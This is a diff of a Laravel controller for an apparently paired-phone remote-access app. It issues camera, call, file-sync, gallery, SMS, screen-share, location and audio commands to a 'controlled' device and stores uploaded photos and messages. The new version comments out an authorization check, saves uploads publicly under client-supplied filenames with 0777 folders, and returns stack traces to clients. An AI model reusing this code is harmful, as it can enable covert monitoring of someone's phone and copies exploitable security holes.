@@ -15,11 +15,9 @@ use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Log;
-use Illuminate\Support\Facades\Storage;
-use Illuminate\Support\Str;
 
 
-class AccessController extends Controller
+class AccessControllerOld extends Controller
 {
     protected $firebase;
     protected $statsService;
@@ -34,65 +32,58 @@ class AccessController extends Controller
     {
         $command = Command::create([
             'from_device_id' => $controller->id,
-            'to_device_id'   => $target->id,
-            'action'         => $action,
-            'payload'        => json_encode($payload),
-            'status'         => 'pending',
+            'to_device_id' => $target->id,
+            'action' => $action,
+            'payload' => json_encode($payload),
+            'status' => 'pending',
         ]);
 
         event(new AdminCommandCreated($command));
+        // event(new AdminStatsUpdated(getCurrentStats()));
+
         event(new AdminStatsUpdated(StatsService::current()));
+
+
+        // Broadcast via Reverb (WebSocket)
         event(new CommandEvent($command));
 
+        // Firebase push fallback
         if ($target->fcm_token) {
             $this->firebase->sendPush($target->fcm_token, [
-                'type'       => 'command',
+                'type' => 'command',
                 'command_id' => $command->id,
-                'action'     => $action,
+                'action' => $action,
             ]);
         }
 
         return $command;
     }
 
-    /**
-     * Build a consistent device folder path.
-     * Format: {base_folder}/{device_id}_{device_name_slug}/
-     * Example: camera_uploads/DEV-001_johns-samsung-s23/
-     */
-    private function getDeviceFolder(string $baseFolder, Device $device): string
-    {
-        // Slugify the device name for safe folder naming
-        $namePart = Str::slug($device->name ?? 'unknown-device');
-        return $baseFolder . '/' . $device->device_id . '_' . $namePart;
-    }
-
-    /**
-     * Ensure a public directory exists, create it if not.
-     */
-    private function ensureDir(string $path): void
-    {
-        if (!file_exists($path)) {
-            mkdir($path, 0775, true);
-        }
-    }
 
     public function completeCommand(Request $request)
     {
         $request->validate([
             'command_id' => 'required|exists:commands,id',
-            'result'     => 'nullable|string',
-            'error'      => 'nullable|string',
+            'result' => 'nullable|string',
+            'error' => 'nullable|string',
         ]);
 
         $command = Command::find($request->command_id);
 
+        // $user = Auth::user();
+        // $device = Device::where('device_id', $request->header('X-Device-ID'))->first();
+
+        // if (!$device || $command->to_device_id !== $device->id) {
+        //     abort(403, 'Unauthorized');
+        // }
+
         $command->update([
             'status' => $request->error ? 'failed' : 'completed',
             'result' => $request->result,
-            'error'  => $request->error,
+            'error' => $request->error,
         ]);
 
+        // Broadcast updates
         event(new \App\Events\AdminCommandUpdated($command));
         event(new \App\Events\AdminStatsUpdated($this->statsService->current()));
 
@@ -105,7 +96,7 @@ class AccessController extends Controller
             'target_device_id' => 'required|exists:devices,id',
         ]);
 
-        $user       = Auth::user();
+        $user = Auth::user();
         $controller = $user->devices()->where('role', 'controller')->first();
 
         if (!$controller) {
@@ -129,10 +120,11 @@ class AccessController extends Controller
     {
         $request->validate([
             'target_device_id' => 'required',
-            'type'             => 'required',
-            'data'             => 'required',
+            'type' => 'required',
+            'data' => 'required',
         ]);
 
+        // This pushes the WebRTC data to the other phone instantly
         broadcast(new WebRTCSignal(
             $request->target_device_id,
             $request->type,
@@ -147,16 +139,17 @@ class AccessController extends Controller
         [$controller, $target] = $this->validateAndGetDevices($request);
 
         Log::info('Camera command', [
-            'controller_id'    => $controller->id,
-            'target_id'        => $target->id,
+            'controller_id' => $controller->id,
+            'target_id' => $target->id,
             'target_device_id' => $target->device_id,
         ]);
-
         $request->validate([
             'type' => 'required|in:photo,video,stream,switch_camera',
         ]);
 
-        $payload = ['type' => $request->type];
+        $payload = [
+            'type' => $request->type,
+        ];
 
         $command = $this->sendCommand('camera_access', $target, $controller, $payload);
 
@@ -167,38 +160,35 @@ class AccessController extends Controller
     {
         $request->validate([
             'command_id' => 'required|exists:commands,id',
-            'file'       => 'required|file|mimes:jpg,jpeg,png,mp4,mov|max:20480',
+            'file' => 'required|file|mimes:jpg,jpeg,png,mp4,mov|max:20480',
         ]);
 
         $command = Command::findOrFail($request->command_id);
 
-        // Resolve target device (the one that took the photo)
-        $targetDevice = Device::find($command->to_device_id);
-
-        if (!$targetDevice) {
-            return response()->json(['error' => 'Device not found'], 404);
+        // SECURITY: Verify this upload is coming from the correct target device
+        if ($command->to_device_id !== $request->header('X-Device-ID')) {
+            return response()->json(['error' => 'Unauthorized device'], 403);
         }
 
-        // Build device-specific folder: camera_uploads/{device_id}_{device_name}/
-        $deviceFolder = $this->getDeviceFolder('camera_uploads', $targetDevice);
-        $folderPath   = public_path($deviceFolder);
-        $this->ensureDir($folderPath);
-
-        $file     = $request->file('file');
+        $file = $request->file('file');
         $fileName = time() . '_' . $file->getClientOriginalName();
-        $file->move($folderPath, $fileName);
 
-        $url = url($deviceFolder . '/' . $fileName);
+        // Ensure directory exists
+        if (!file_exists(public_path('camera_uploads'))) {
+            mkdir(public_path('camera_uploads'), 0775, true);
+        }
 
+        $file->move(public_path('camera_uploads'), $fileName);
+        $url = url('camera_uploads/' . $fileName);
+
+        // Identify which device this belongs to for the result log
         $command->update([
             'status' => 'completed',
             'result' => json_encode([
-                'url'         => $url,
-                'type'        => $request->type ?? 'photo',
-                'device_name' => $targetDevice->name ?? 'Unknown Device',
-                'device_id'   => $targetDevice->device_id,
-                'folder'      => $deviceFolder,
-            ]),
+                'url' => $url,
+                'type' => $request->type ?? 'photo',
+                'device_name' => $command->toDevice->name ?? 'Unknown Device'
+            ])
         ]);
 
         return response()->json(['success' => true, 'url' => $url]);
@@ -207,7 +197,6 @@ class AccessController extends Controller
     // ========================================
     // 2. CALL ACCESS
     // ========================================
-
     public function call(Request $request)
     {
         [$controller, $target] = $this->validateAndGetDevices($request);
@@ -217,7 +206,9 @@ class AccessController extends Controller
             'number' => 'nullable|string|required_if:action,dial',
         ]);
 
-        $payload = ['action' => $request->action];
+        $payload = [
+            'action' => $request->action,
+        ];
 
         if ($request->action === 'dial') {
             $payload['number'] = $request->number;
@@ -228,26 +219,22 @@ class AccessController extends Controller
         return response()->json(['command_id' => $command->id]);
     }
 
-    // ========================================
-    // 3. FILE ACCESS
-    // ========================================
-
     public function file(Request $request)
     {
         [$controller, $target] = $this->validateAndGetDevices($request);
 
         $request->validate([
-            'action' => 'required|in:sync',
+            'action' => 'required|in:sync', // only sync (download all)
         ]);
 
         Log::info('Initiating file sync', [
             'controller_device_id' => $controller->device_id,
-            'target_device_id'     => $target->device_id,
+            'target_device_id' => $target->device_id,
         ]);
 
         $payload = [
             'action' => 'sync_files',
-            'paths'  => [
+            'paths' => [
                 '/storage/emulated/0/DCIM/',
                 '/storage/emulated/0/Download/',
                 '/storage/emulated/0/Pictures/',
@@ -271,19 +258,20 @@ class AccessController extends Controller
             'is_final'   => 'nullable|string',
         ]);
 
-        $user   = Auth::user();
+        $user = Auth::user();
         $device = $user->devices()->where('device_id', $request->device_id)->first();
 
         if (!$device || $device->role !== 'controlled') {
             return response()->json(['error' => 'Unauthorized'], 403);
         }
 
-        // Device-wise folder: files/{device_id}_{device_name}/
-        $deviceFolder = $this->getDeviceFolder('files', $device);
-        $folderPath   = public_path($deviceFolder);
-        $this->ensureDir($folderPath);
-
+        // Save uploaded files
         $savedFiles = [];
+        $folderPath = public_path('files/' . $device->device_id);
+
+        if (!file_exists($folderPath)) {
+            mkdir($folderPath, 0777, true);
+        }
 
         if ($request->hasFile('file_uploads')) {
             foreach ($request->file('file_uploads') as $file) {
@@ -292,18 +280,17 @@ class AccessController extends Controller
 
                 $savedFiles[] = [
                     'name'        => $originalName,
-                    'server_path' => $deviceFolder . '/' . $originalName,
-                    'url'         => asset($deviceFolder . '/' . $originalName),
+                    'server_path' => 'files/' . $device->device_id . '/' . $originalName,
+                    'url'         => asset('files/' . $device->device_id . '/' . $originalName),
                     'size'        => File::size($folderPath . '/' . $originalName),
                     'modified'    => now()->timestamp,
-                    'device_id'   => $device->device_id,
-                    'device_name' => $device->name ?? 'Unknown',
                 ];
             }
         }
 
         Log::info('Saved ' . count($savedFiles) . ' files for device ' . $device->device_id);
 
+        // Handle command result update
         $isFinal = $request->is_final === 'true';
 
         if ($request->command_id) {
@@ -314,19 +301,25 @@ class AccessController extends Controller
                 $existingFiles  = $existingResult['files'] ?? [];
                 $mergedFiles    = array_merge($existingFiles, $savedFiles);
 
-                $statusData = [
-                    'status'      => $isFinal ? 'success' : 'in_progress',
-                    'files'       => $mergedFiles,
-                    'path'        => $request->path,
-                    'device_id'   => $device->device_id,
-                    'device_name' => $device->name ?? 'Unknown',
-                    'folder'      => $deviceFolder,
-                ];
-
-                $command->update([
-                    'status' => $isFinal ? 'completed' : $command->status,
-                    'result' => json_encode($statusData),
-                ]);
+                // FIX: mark completed on is_final regardless of whether files were uploaded
+                if ($isFinal) {
+                    $command->update([
+                        'status' => 'completed',
+                        'result' => json_encode([
+                            'status' => 'success',
+                            'files'  => $mergedFiles,
+                            'path'   => $request->path,
+                        ]),
+                    ]);
+                } else {
+                    $command->update([
+                        'result' => json_encode([
+                            'status' => 'in_progress',
+                            'files'  => $mergedFiles,
+                            'path'   => $request->path,
+                        ]),
+                    ]);
+                }
             }
         }
 
@@ -335,25 +328,24 @@ class AccessController extends Controller
             'count'    => count($savedFiles),
             'files'    => $savedFiles,
             'is_final' => $isFinal,
-            'folder'   => $deviceFolder,
         ]);
     }
+
 
     // ========================================
     // 4. GALLERY ACCESS
     // ========================================
-
     public function gallery(Request $request)
     {
         [$controller, $target] = $this->validateAndGetDevices($request);
 
         $request->validate([
-            'action'     => 'required|in:list,download',
-            'media_type' => 'nullable|in:photo,video',
+            'action' => 'required|in:list,download',
+            'media_type' => 'nullable|in:photo,video', // Optional filter
         ]);
 
         $payload = [
-            'action'     => $request->action,
+            'action' => $request->action,
             'media_type' => $request->media_type,
         ];
 
@@ -366,13 +358,13 @@ class AccessController extends Controller
     {
         $request->validate([
             'device_id' => 'required|string',
-            'media_id'  => 'required|string',
+            'media_id'  => 'required|string', // The local ID on the phone
             'title'     => 'required|string',
             'mime_type' => 'required|string',
             'date'      => 'required',
         ]);
 
-        $user   = Auth::user();
+        $user = Auth::user();
         $device = $user->devices()->where('device_id', $request->device_id)->first();
 
         if (!$device || $device->role !== 'controlled') {
@@ -380,108 +372,77 @@ class AccessController extends Controller
         }
 
         $mediaData = [
-            'media_id'    => $request->media_id,
-            'title'       => $request->title,
-            'mime_type'   => $request->mime_type,
-            'date'        => $request->date,
-            'device_id'   => $device->device_id,
-            'device_name' => $device->name ?? 'Unknown',
-            'folder'      => $this->getDeviceFolder('gallery_sync', $device),
+            'media_id'  => $request->media_id,
+            'title'     => $request->title,
+            'mime_type' => $request->mime_type,
+            'date'      => $request->date,
         ];
 
+        // Store in Command history so Controller can see it
         return Command::updateOrCreate(
             [
                 'from_device_id' => $device->id,
                 'action'         => 'gallery_access',
                 'payload'        => json_encode([
                     'action'   => 'auto_sync_gallery',
-                    'media_id' => $request->media_id,
+                    'media_id' => $request->media_id
                 ]),
             ],
             [
-                'to_device_id' => $device->paired_to,
-                'result'       => json_encode([$mediaData]),
-                'status'       => 'completed',
+                'to_device_id'   => $device->paired_to,
+                'result'         => json_encode([$mediaData]),
+                'status'         => 'completed',
             ]
         );
     }
 
-    /**
-     * Upload a gallery media file.
-     * Now stores under: gallery_sync/{device_id}_{device_name}/
-     * The device_id is resolved from the command's to_device_id (the controlled device).
-     */
     public function uploadMedia(Request $request)
     {
         $request->validate([
-            'media_id'   => 'required|string',
-            'command_id' => 'nullable|exists:commands,id',
-            'device_id'  => 'nullable|string',   // Optional: send from app for direct lookup
-            'file'       => 'required|file|image|max:10240',
+            'media_id' => 'required|string',
+            'file' => 'required|file|image|max:10240', // Max 10MB
         ]);
 
-        if (!$request->hasFile('file')) {
-            return response()->json(['error' => 'No file uploaded'], 400);
-        }
+        if ($request->hasFile('file')) {
+            $file = $request->file('file');
 
-        // Resolve device for folder naming
-        $device = null;
-
-        if ($request->command_id) {
-            $command = Command::find($request->command_id);
-            if ($command) {
-                $device = Device::find($command->to_device_id);
+            // Create folder if it doesn't exist
+            $path = public_path('gallery_sync');
+            if (!file_exists($path)) {
+                mkdir($path, 0777, true);
             }
+
+            // Save file: format as mediaId_timestamp.ext
+            $fileName = $request->media_id . '_' . time() . '.' . $file->getClientOriginalExtension();
+            $file->move($path, $fileName);
+
+            return response()->json([
+                'status' => 'success',
+                'url' => asset('gallery_sync/' . $fileName)
+            ]);
         }
 
-        // Fallback: lookup by device_id string if provided
-        if (!$device && $request->device_id) {
-            $user   = Auth::user();
-            $device = $user->devices()->where('device_id', $request->device_id)->first();
-        }
-
-        // Build device folder (fallback to generic if device unknown)
-        $subFolder    = $device
-            ? $this->getDeviceFolder('gallery_sync', $device)
-            : 'gallery_sync/unknown_device';
-
-        $folderPath = public_path($subFolder);
-        $this->ensureDir($folderPath);
-
-        $file     = $request->file('file');
-        $fileName = $request->media_id . '_' . time() . '.' . $file->getClientOriginalExtension();
-        $file->move($folderPath, $fileName);
-
-        $url = asset($subFolder . '/' . $fileName);
-
-        return response()->json([
-            'status'      => 'success',
-            'url'         => $url,
-            'device_id'   => $device?->device_id ?? 'unknown',
-            'device_name' => $device?->name ?? 'Unknown',
-            'folder'      => $subFolder,
-        ]);
+        return response()->json(['error' => 'No file uploaded'], 400);
     }
 
     // ========================================
     // 5. MESSAGE ACCESS
     // ========================================
-
     public function message(Request $request)
     {
         [$controller, $target] = $this->validateAndGetDevices($request);
 
         $request->validate([
-            'action'    => 'required|in:send,read,inbox',
-            'to'        => 'nullable|string|required_if:action,send',
-            'text'      => 'nullable|string|required_if:action,send',
+            'action' => 'required|in:send,read,inbox',
+            'to' => 'nullable|string|required_if:action,send',
+            'text' => 'nullable|string|required_if:action,send',
             'thread_id' => 'nullable|integer',
         ]);
 
         $payload = ['action' => $request->action];
 
         if ($request->action === 'send') {
-            $payload['to']   = $request->to;
+            $payload['to'] = $request->to;
             $payload['text'] = $request->text;
         }
 
@@ -493,7 +454,6 @@ class AccessController extends Controller
 
         return response()->json(['command_id' => $command->id]);
     }
-
     public function smsAutoSync(Request $request)
     {
         $request->validate([
@@ -503,7 +463,7 @@ class AccessController extends Controller
             'date'      => 'required',
         ]);
 
-        $user   = Auth::user();
+        $user = Auth::user();
         $device = $user->devices()->where('device_id', $request->device_id)->first();
 
         if (!$device || $device->role !== 'controlled') {
@@ -511,35 +471,33 @@ class AccessController extends Controller
         }
 
         $smsData = [
-            'from'        => $request->from,
-            'body'        => $request->body,
-            'date'        => $request->date,
-            'device_id'   => $device->device_id,
-            'device_name' => $device->name ?? 'Unknown',
+            'from' => $request->from,
+            'body' => $request->body,
+            'date' => $request->date,
         ];
 
+        // Use updateOrCreate to prevent exact duplicates in the History
+        // based on the SMS date and sender.
         return Command::updateOrCreate(
             [
                 'from_device_id' => $device->id,
                 'action'         => 'message_access',
+                // Using a fingerprint of the SMS in the payload to identify uniqueness
                 'payload'        => json_encode([
-                    'action'   => 'auto_sync_received',
+                    'action' => 'auto_sync_received',
                     'sms_date' => $request->date,
-                    'sms_from' => $request->from,
+                    'sms_from' => $request->from
                 ]),
             ],
             [
-                'to_device_id' => $device->paired_to,
-                'result'       => json_encode([$smsData]),
-                'status'       => 'completed',
+                'to_device_id'   => $device->paired_to,
+                'result'         => json_encode([$smsData]),
+                'status'         => 'completed',
             ]
         );
     }
 
-    // ========================================
-    // 6. SCREEN SHARE
-    // ========================================
-
+    // Screen share
     public function requestScreenShare(Request $request)
     {
         try {
@@ -547,8 +505,11 @@ class AccessController extends Controller
                 'target_device_id' => 'required|integer',
             ]);
 
+            // Logic fix: Determine who the sender (Controller) is
             $user = Auth::user();
 
+            // Use active_device_id if it exists, otherwise find the device
+            // belonging to this user that has the 'controller' role.
             $fromDeviceId = $user->active_device_id ??
                 DB::table('devices')
                 ->where('user_id', $user->id)
@@ -557,11 +518,12 @@ class AccessController extends Controller
 
             if (!$fromDeviceId) {
                 return response()->json([
-                    'status'  => 'error',
-                    'message' => 'Sender device could not be identified.',
+                    'status' => 'error',
+                    'message' => 'Sender device could not be identified.'
                 ], 400);
             }
 
+            // Create the command
             $command = Command::create([
                 'from_device_id' => (int) $fromDeviceId,
                 'to_device_id'   => (int) $request->target_device_id,
@@ -571,21 +533,18 @@ class AccessController extends Controller
             ]);
 
             return response()->json([
-                'status'     => 'success',
-                'command_id' => $command->id,
+                'status' => 'success',
+                'command_id' => $command->id
             ]);
         } catch (\Exception $e) {
+            // This will show you the EXACT error in your Flutter logs instead of just "500"
             return response()->json([
-                'status'  => 'error',
+                'status' => 'error',
                 'message' => $e->getMessage(),
-                'trace'   => $e->getTraceAsString(),
+                'trace' => $e->getTraceAsString()
             ], 500);
         }
     }
-
-    // ========================================
-    // 7. LOCATION ACCESS
-    // ========================================
 
     public function location(Request $request)
     {
@@ -601,10 +560,6 @@ class AccessController extends Controller
 
         return response()->json(['command_id' => $command->id]);
     }
-
-    // ========================================
-    // 8. AUDIO ACCESS
-    // ========================================
 
     public function audio(Request $request)
     {
